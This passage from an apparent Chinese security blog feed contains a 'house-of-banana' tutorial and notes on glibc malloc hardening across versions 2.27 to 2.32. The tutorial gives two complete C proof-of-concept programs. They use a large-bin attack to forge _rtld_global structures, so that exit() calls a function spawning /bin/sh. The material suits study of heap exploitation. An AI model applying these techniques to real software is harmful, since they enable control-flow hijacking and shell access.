data-srcset="/2021/12/17/pwnwaf/image-20220619111109368.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20220619111109368"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>house-of-banana</title>
      <link href="/2021/12/06/house-of-banana/"/>
      <url>/2021/12/06/house-of-banana/</url>
      
        <content type="html"><![CDATA[<h3 id="house-of-banana学习笔记"><a href="#house-of-banana学习笔记" class="headerlink" title="house-of-banana学习笔记"></a>house-of-banana学习笔记</h3><span id="more"></span><p>早就听闻banana的强大，今天来学习一波。</p><p><strong>使用条件（满足任一条件即可）：</strong></p><ul><li><p>程序能够显式的执行exit函数</p></li><li><p>程序通过libc_start_main启动的主函数，且主函数能够结束</p></li></ul><h3 id="1-劫持-ns-loaded"><a href="#1-劫持-ns-loaded" class="headerlink" title="1.劫持_ns_loaded"></a>1.劫持_ns_loaded</h3><p>我们先来看一下<code>fini_array</code>这个数组是如何被调用的。</p><p><img src="/2021/12/06/house-of-banana/image-20211206202855123.png" class="lazyload placeholder" data-srcset="/2021/12/06/house-of-banana/image-20211206202855123.png" srcset="https://pic1.zhimg.com/v2-cd38920285d125be80b3eb504052c550_b.webp" alt="image-20211206202855123"></p><p>因此我们直接分析源码,只看其中的一个for循环</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">  /*ns = 0*/</span><br><span class="line">  for (Lmid_t ns = GL(dl_nns) - 1; ns &gt;= 0; --ns)</span><br><span class="line">    &#123;</span><br><span class="line">      __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">  /*nloaded = 4*/</span><br><span class="line">      unsigned int nloaded = GL(dl_ns)[ns]._ns_nloaded;</span><br><span class="line">      if (nloaded == 0</span><br><span class="line">#ifdef SHARED</span><br><span class="line">  || GL(dl_ns)[ns]._ns_loaded-&gt;l_auditing != do_audit</span><br><span class="line">#endif</span><br><span class="line">  )</span><br><span class="line">__rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line">      else</span><br><span class="line">&#123;</span><br><span class="line">  struct link_map *maps[nloaded];</span><br><span class="line"></span><br><span class="line">  unsigned int i;</span><br><span class="line">  struct link_map *l;</span><br><span class="line">  assert (nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL);</span><br><span class="line">  for (l = GL(dl_ns)[ns]._ns_loaded, i = 0; l != NULL; l = l-&gt;l_next)</span><br><span class="line">    if (l == l-&gt;l_real)</span><br><span class="line">      &#123;</span><br><span class="line">assert (i &lt; nloaded);</span><br><span class="line"></span><br><span class="line">maps[i] = l;</span><br><span class="line">l-&gt;l_idx = i;</span><br><span class="line">++i;</span><br><span class="line"></span><br><span class="line">++l-&gt;l_direct_opencount;</span><br><span class="line">      &#125;</span><br><span class="line">      /*LM_ID_BASE=0*/</span><br><span class="line">  assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">  assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);</span><br><span class="line">  unsigned int nmaps = i;</span><br><span class="line"></span><br><span class="line">  _dl_sort_maps (maps + (ns == LM_ID_BASE), nmaps - (ns == LM_ID_BASE),</span><br><span class="line"> NULL, true);</span><br><span class="line"></span><br><span class="line">  __rtld_lock_unlock_recursive (GL(dl_load_lock));</span><br><span class="line"></span><br><span class="line">  for (i = 0; i &lt; nmaps; ++i)</span><br><span class="line">    &#123;</span><br><span class="line">      struct link_map *l = maps[i];</span><br><span class="line"></span><br><span class="line">      if (l-&gt;l_init_called)</span><br><span class="line">&#123;</span><br><span class="line">  l-&gt;l_init_called = 0;</span><br><span class="line"></span><br><span class="line">  /*DT_FINI=13  */</span><br><span class="line">  if (l-&gt;l_info[DT_FINI_ARRAY] != NULL</span><br><span class="line">      || l-&gt;l_info[DT_FINI] != NULL)</span><br><span class="line">    &#123;</span><br><span class="line">      if (__builtin_expect (GLRO(dl_debug_mask)</span><br><span class="line">    &amp; DL_DEBUG_IMPCALLS, 0))</span><br><span class="line">_dl_debug_printf (&quot;\ncalling fini: %s [%lu]\n\n&quot;,</span><br><span class="line">  DSO_FILENAME (l-&gt;l_name),</span><br><span class="line">  ns);</span><br><span class="line"></span><br><span class="line">      /* DT_FINI_ARRAY=26，DT_FINI_ARRAYSZ=28*/</span><br><span class="line">      if (l-&gt;l_info[DT_FINI_ARRAY] != NULL)</span><br><span class="line">&#123;</span><br><span class="line">  ElfW(Addr) *array =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">    / sizeof (ElfW(Addr)));</span><br><span class="line">  while (i-- &gt; 0)</span><br><span class="line">    ((fini_t) array[i]) ();</span><br><span class="line">&#125;</span><br><span class="line">……………</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>可以看到想要执行array[i]()，第一种方法就是劫持<code>GL(dl_ns)[0]._ns_loaded</code>，将其改为一个堆的地址。</p><ul><li>这两个条件即可以看出，for要循环四次，maps[i]需要赋四个值。</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">assert (ns != LM_ID_BASE || i == nloaded);</span><br><span class="line">assert (ns == LM_ID_BASE || i == nloaded || i == nloaded - 1);</span><br></pre></td></tr></table></figure><ul><li><p><code>l-&gt;l_init_called</code>需要等于1,只占一位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enum/* Where this object came from.  */</span><br><span class="line">&#123;</span><br><span class="line">lt_executable,/* The main executable program.  */</span><br><span class="line">lt_library,/* Library needed by main executable.  */</span><br><span class="line">lt_loaded/* Extra run-time loaded shared object.  */</span><br><span class="line">&#125; l_type:2;</span><br><span class="line">unsigned int l_relocated:1;/* Nonzero if object&#x27;s relocations done.  */</span><br><span class="line">unsigned int l_init_called:1; /* Nonzero if DT_INIT function called.  */</span><br></pre></td></tr></table></figure></li><li><p><code>l-&gt;l_info[DT_FINI_ARRAY] != NULL|| l-&gt;l_info[DT_FINI] != NULL</code></p></li><li><p><code>l-&gt;l_addr</code>需要是目标函数的地址且<code>l-&gt;l_info[26]-&gt;d_un.d_ptr</code> 为0，<code>l-&gt;l_info[28]-&gt;d_un.d_val</code>为8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Addr) *array =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">    / sizeof (ElfW(Addr)));</span><br></pre></td></tr></table></figure></li></ul><p><strong>poc</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br></pre></td><td class="code"><pre><span class="line">#gcc -g house-of-banana.c -o house-of-banana</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void backdoor() &#123;</span><br><span class="line">   puts(&quot;you hacked me!!&quot;);</span><br><span class="line">   system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   puts(&quot;house of banana&#x27;s poc&quot;);</span><br><span class="line">   size_t libc_base = &amp;puts - 0x875a0;</span><br><span class="line">   size_t _rtld_global_ptr_addr = libc_base + 0x243060;</span><br><span class="line">   char *ptr0 = malloc(0x450);</span><br><span class="line">   char *gap = malloc(0x10);</span><br><span class="line">   char *ptr1 = malloc(0x440);</span><br><span class="line">   gap = malloc(0x10);</span><br><span class="line">   char *ptr2 = malloc(0x410);</span><br><span class="line">   gap = malloc(0x10);</span><br><span class="line"></span><br><span class="line">   free(ptr0);</span><br><span class="line">   //put ptr9 into large bin</span><br><span class="line">   malloc(0x500);</span><br><span class="line">   free(ptr1); //free ptr1 into unsorted bin</span><br><span class="line">   free(ptr2); //free ptr2 into unsorted bin</span><br><span class="line">   //bk_nextsize = _rtld_global_ptr_addr</span><br><span class="line">   *(size_t *)(ptr0 + 0x18) = _rtld_global_ptr_addr - 0x20;</span><br><span class="line">   malloc(0x410); //large bin attack to  hijack _rtld_global_ptr</span><br><span class="line"></span><br><span class="line">   //fake a _rtld_global</span><br><span class="line">   size_t fake_rtld_global_addr = ptr1 - 0x10;</span><br><span class="line">   size_t *fake_rtld_global = (size_t *)ptr1;</span><br><span class="line">   char buf[0x100];</span><br><span class="line">   //the chain&#x27;s length must &gt;= 4</span><br><span class="line">   fake_rtld_global[1] = &amp;fake_rtld_global[2];</span><br><span class="line">   fake_rtld_global[3] = fake_rtld_global_addr;</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[2+3] = &amp;fake_rtld_global[3];</span><br><span class="line">   fake_rtld_global[2+5] = &amp;fake_rtld_global[2];</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[3+3] = &amp;fake_rtld_global[8];</span><br><span class="line">   fake_rtld_global[3+5] = &amp;fake_rtld_global[3];</span><br><span class="line"></span><br><span class="line">   fake_rtld_global[8+3] = 0;</span><br><span class="line">   fake_rtld_global[8+5] = &amp;fake_rtld_global[8];</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   //fake a fini_array segment</span><br><span class="line">   //_rtld_global._dl_ns[0].l_info[26]!=0 </span><br><span class="line">   fake_rtld_global[0x20] = &amp;fake_rtld_global[0x30];</span><br><span class="line">   //_rtld_global._dl_ns[0].l_info[28].d_un.d_val=8</span><br><span class="line">   fake_rtld_global[0x22] = &amp;fake_rtld_global[0x23];</span><br><span class="line">   fake_rtld_global[0x23+1] = 0x8; //func ptrs total len</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">   fake_rtld_global[0x30] = 0x1A;//这里不知道这个值的作用，置0也ok</span><br><span class="line">   //_rtld_global._dl_ns[0].l_info[26].d_un.d_ptr=0</span><br><span class="line">   fake_rtld_global[0x31] = 0;</span><br><span class="line">   //array=&amp;fake_rtld_global[0x32]</span><br><span class="line">   fake_rtld_global[-2] = &amp;fake_rtld_global[0x32];</span><br><span class="line"></span><br><span class="line">   //funcs</span><br><span class="line">   fake_rtld_global[0x32] = backdoor;</span><br><span class="line">   //l-&gt;l_init_called=1</span><br><span class="line">   fake_rtld_global[0x61] = 0x800000000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="劫持-rtld-global-dl-ns-ns-loaded-l-next-l-next-l-next"><a href="#劫持-rtld-global-dl-ns-ns-loaded-l-next-l-next-l-next" class="headerlink" title="劫持_rtld_global._dl_ns._ns_loaded.l_next.l_next.l_next"></a>劫持_rtld_global._dl_ns._ns_loaded.l_next.l_next.l_next</h3><p>因为劫持_ns_loaded需要绕过两次assert()，比较麻烦，因此我们可以直接劫持<code>_rtld_global._dl_ns._ns_loaded.l_next.l_next.l_next</code>，将其修改为chunk的地址，破坏更小，绕过更简单。</p><p>和上面的方法大体一样</p><ul><li><p>我们需要将l_next置0</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">assert (nloaded != 0 || GL(dl_ns)[ns]._ns_loaded == NULL);</span><br></pre></td></tr></table></figure></li><li><p>为了能使maps[3]=l，需要使l_real==l</p></li><li><p><code>l-&gt;l_init_called</code>需要等于1,只占一位</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enum/* Where this object came from.  */</span><br><span class="line">&#123;</span><br><span class="line">lt_executable,/* The main executable program.  */</span><br><span class="line">lt_library,/* Library needed by main executable.  */</span><br><span class="line">lt_loaded/* Extra run-time loaded shared object.  */</span><br><span class="line">&#125; l_type:2;</span><br><span class="line">unsigned int l_relocated:1;/* Nonzero if object&#x27;s relocations done.  */</span><br><span class="line">unsigned int l_init_called:1; /* Nonzero if DT_INIT function called.  */</span><br></pre></td></tr></table></figure></li><li><p><code>l-&gt;l_info[DT_FINI_ARRAY] != NULL|| l-&gt;l_info[DT_FINI] != NULL</code></p></li><li><p><code>l-&gt;l_addr</code>需要是目标函数的地址且<code>l-&gt;l_info[26]-&gt;d_un.d_ptr</code> 为0，<code>l-&gt;l_info[28]-&gt;d_un.d_val</code>为8</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ElfW(Addr) *array =</span><br><span class="line">    (ElfW(Addr) *) (l-&gt;l_addr</span><br><span class="line">    + l-&gt;l_info[DT_FINI_ARRAY]-&gt;d_un.d_ptr);</span><br><span class="line">  unsigned int i = (l-&gt;l_info[DT_FINI_ARRAYSZ]-&gt;d_un.d_val</span><br><span class="line">    / sizeof (ElfW(Addr)));</span><br></pre></td></tr></table></figure></li></ul><p><strong>poc</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">#gcc -g house-of-banana.c -o house-of-banana</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">void backdoor() &#123;</span><br><span class="line">   puts(&quot;you hacked me!!&quot;);</span><br><span class="line">   system(&quot;/bin/sh&quot;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main() &#123;</span><br><span class="line">   puts(&quot;house of banana&#x27;s poc&quot;);</span><br><span class="line">   size_t libc_base = &amp;puts - 0x875a0;</span><br><span class="line">   size_t _rtld_global_ptr_addr = libc_base + 0x243060;</span><br><span class="line">   char *ptr0 = malloc(0x450);</span><br><span class="line">   char *gap = malloc(0x10);</span><br><span class="line">   char *ptr1 = malloc(0x440);</span><br><span class="line">   gap = malloc(0x10);</span><br><span class="line">   char *ptr2 = malloc(0x410);</span><br><span class="line">   gap = malloc(0x10);</span><br><span class="line"></span><br><span class="line">   free(ptr0);</span><br><span class="line">   //put ptr9 into large bin</span><br><span class="line">   malloc(0x500);</span><br><span class="line">   free(ptr1); //free ptr1 into unsorted bin</span><br><span class="line">   free(ptr2); //free ptr2 into unsorted bin</span><br><span class="line">   //bk_nextsize = _rtld_global_ptr_addr</span><br><span class="line">   *(size_t *)(ptr0 + 0x18) = _rtld_global_ptr_addr - 0x51048 - 0x20;</span><br><span class="line">   malloc(0x410); //large bin attack to  hijack _rtld_global_ptr</span><br><span class="line"></span><br><span class="line">   //fake a _rtld_global</span><br><span class="line">   size_t fake_rtld_global_addr = ptr1 - 0x10;</span><br><span class="line">   size_t *fake_rtld_global = (size_t *)ptr1;</span><br><span class="line">   char buf[0x100];</span><br><span class="line">   </span><br><span class="line">   //l_next=0,l_real==l</span><br><span class="line">   fake_rtld_global[1] = 0;</span><br><span class="line">   fake_rtld_global[3] = fake_rtld_global_addr;</span><br><span class="line"></span><br><span class="line">   //fake a fini_array segment</span><br><span class="line">   //_rtld_global._dl_ns[0].l_info[26]!=0</span><br><span class="line">   fake_rtld_global[0x20] = &amp;fake_rtld_global[6];</span><br><span class="line">   //_rtld_global._dl_ns[0].l_info[28].d_un.d_val=8</span><br><span class="line">   fake_rtld_global[0x22] = &amp;fake_rtld_global[9];</span><br><span class="line">   fake_rtld_global[10] = 0x8; //func ptrs total len</span><br><span class="line"></span><br><span class="line">   //_rtld_global._dl_ns[0].l_info[26].d_un.d_ptr=0</span><br><span class="line">   fake_rtld_global[7] = 0;</span><br><span class="line">   //array=&amp;fake_rtld_global[8]</span><br><span class="line">   fake_rtld_global[-2] = &amp;fake_rtld_global[8];</span><br><span class="line"></span><br><span class="line">   //funcs</span><br><span class="line">   fake_rtld_global[8] = backdoor;</span><br><span class="line">   //l-&gt;l_init_called=1</span><br><span class="line">   fake_rtld_global[0x61] = 0x800000000;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>house-of-banana的强大之处在于它将攻击重点转向了程序退出时的部分，并且目前适用于所有版本。只要调用了exit函数，就可以使用它。学习这个技巧时的难点在于struct rtld_global这个结构体。</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><ul><li><p><a href="https://www.anquanke.com/post/id/222948#h3-6">house of banana - 安全客，安全资讯平台 (anquanke.com)</a> </p></li><li><p><a href="https://giles-one.github.io/2021/10/04/house-of-%E7%B3%BB%E5%88%97%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/">house_of_banana源码分析 | Blog of cat03 (giles-one.github.io)</a> </p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>glibc源码分析</title>
      <link href="/2021/12/02/glibc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/"/>
      <url>/2021/12/02/glibc%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90/</url>
      
        <content type="html"><![CDATA[<h3 id="glibc"><a href="#glibc" class="headerlink" title="glibc"></a>glibc</h3><span id="more"></span><p>最近在看malloc的源码，因此记录一下各主流版本之间的差别。</p><h3 id="glibc-2-27"><a href="#glibc-2-27" class="headerlink" title="glibc-2.27"></a>glibc-2.27</h3><ul><li><p>2.27增加了tcache</p></li><li><p>在malloc_consolidate中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/*新增：检查从fastbin中取出的chunk的大小是否满足fastbin的索引，house-of-rabbit无法使用  */</span><br><span class="line">unsigned int idx = fastbin_index (chunksize (p));</span><br></pre></td></tr></table></figure></li><li><p>在unlink中</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/*新增：检查其下一个chunk的prev_size是否和size相等，即使用house-of-einherjar时第一个chunk应该被放入到unsortedbin中*/</span><br><span class="line">if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0)) </span><br><span class="line">malloc_printerr (&quot;corrupted size vs. prev_size&quot;);</span><br></pre></td></tr></table></figure></li></ul><h3 id="glibc-2-29"><a href="#glibc-2-29" class="headerlink" title="glibc-2.29"></a>glibc-2.29</h3><ul><li><p>tcache_entry结构体中增加了key，防止doublefree</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tcache_entry</span><br><span class="line">&#123;</span><br><span class="line">  struct tcache_entry *next;</span><br><span class="line">  /* This field exists to detect double frees.  */</span><br><span class="line">  struct tcache_perthread_struct *key;</span><br><span class="line">&#125; tcache_entry;</span><br></pre></td></tr></table></figure></li><li><p>对在unsortedbin中即将取出的chunk和其nextchunk做检查</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">/*新增：unsortedbin attack失效，house-of-storm无法使用*/</span><br><span class="line">if (__glibc_unlikely (size &lt;= 2 * SIZE_SZ)</span><br><span class="line">       || __glibc_unlikely (size &gt; av-&gt;system_mem))</span><br><span class="line">malloc_printerr (&quot;malloc(): invalid size (unsorted)&quot;);</span><br><span class="line">if (__glibc_unlikely (chunksize_nomask (next) &lt; 2 * SIZE_SZ)</span><br><span class="line">       || __glibc_unlikely (chunksize_nomask (next) &gt; av-&gt;system_mem))</span><br><span class="line">    malloc_printerr (&quot;malloc(): invalid next size (unsorted)&quot;);</span><br><span class="line">if (__glibc_unlikely ((prev_size (next) &amp; ~(SIZE_BITS)) != size))</span><br><span class="line">    malloc_printerr (&quot;malloc(): mismatching next-&gt;prev_size(unsorted)&quot;);</span><br><span class="line">if (__glibc_unlikely (bck-&gt;fd != victim)</span><br><span class="line">       || __glibc_unlikely (victim-&gt;fd != unsorted_chunks (av)))</span><br><span class="line">    malloc_printerr (&quot;malloc(): unsorted double linked list corrupted&quot;);</span><br><span class="line">if (__glibc_unlikely (prev_inuse (next)))</span><br><span class="line">    malloc_printerr (&quot;malloc(): invalid next-&gt;prev_inuse (unsorted)&quot;);</span><br></pre></td></tr></table></figure></li><li><p>在unlink前增加了对prev_size和size的判断</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/*新增：检查了prev_size和上一个chunk的size是否相等,house-of-einherjar不能使用*/</span><br><span class="line">if (__glibc_unlikely (chunksize(p) != prevsize))</span><br></pre></td></tr></table></figure></li></ul><h3 id="glibc-2-30-amp-glibc-2-31"><a href="#glibc-2-30-amp-glibc-2-31" class="headerlink" title="glibc-2.30&amp;glibc-2.31"></a>glibc-2.30&amp;glibc-2.31</h3><ul><li><p>tcache_perthread_struct中的counts类型变为uint16_t类型</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">typedef struct tcache_perthread_struct</span><br><span class="line">&#123;</span><br><span class="line">  uint16_t counts[TCACHE_MAX_BINS];</span><br><span class="line">  tcache_entry *entries[TCACHE_MAX_BINS];</span><br><span class="line">&#125; tcache_perthread_struct;</span><br></pre></td></tr></table></figure></li><li><p>如果tcache-&gt;counts[tc_idx]&lt;=0则不会从tcache中取chunk</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">if (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache</span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; 0)</span><br><span class="line">&#123;</span><br><span class="line">    return tcache_get (tc_idx);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>将chunk从unsortedbin中取出放入到largebin时做了检查，增大了largebin attack的难度。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">if (__glibc_unlikely (fwd-&gt;bk_nextsize-&gt;fd_nextsize != fwd))</span><br><span class="line">malloc_printerr (&quot;malloc(): largebin double linked list corrupted (nextsize)&quot;);</span><br><span class="line">if (bck-&gt;fd != fwd)</span><br><span class="line">    malloc_printerr (&quot;malloc(): largebin double linked list corrupted (bk)&quot;);</span><br></pre></td></tr></table></figure></li></ul><h3 id="glibc-2-32"><a href="#glibc-2-32" class="headerlink" title="glibc-2.32"></a>glibc-2.32</h3><ul><li><p>tcache中对e-&gt;next也就是fd指针做了加密，(&amp;e-&gt;next&gt;&gt;12)&lt;&lt;12即为heap_base</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">#define PROTECT_PTR(pos, ptr) </span><br><span class="line">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span><br></pre></td></tr></table></figure></li><li><p>对fastbin的fd指针也做了相同的加密。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/*新增：fastbin的fd指针被加密*/</span><br><span class="line">p-&gt;fd = PROTECT_PTR (&amp;p-&gt;fd, old);</span><br></pre></td></tr></table></figure></li><li><p>增加了很多指针是否对齐的检查</p></li></ul>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>第四届安洵杯</title>
      <link href="/2021/11/28/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/"/>
      <url>/2021/11/28/%E7%AC%AC%E5%9B%9B%E5%B1%8A%E5%AE%89%E6%B4%B5%E6%9D%AF/</url>
      
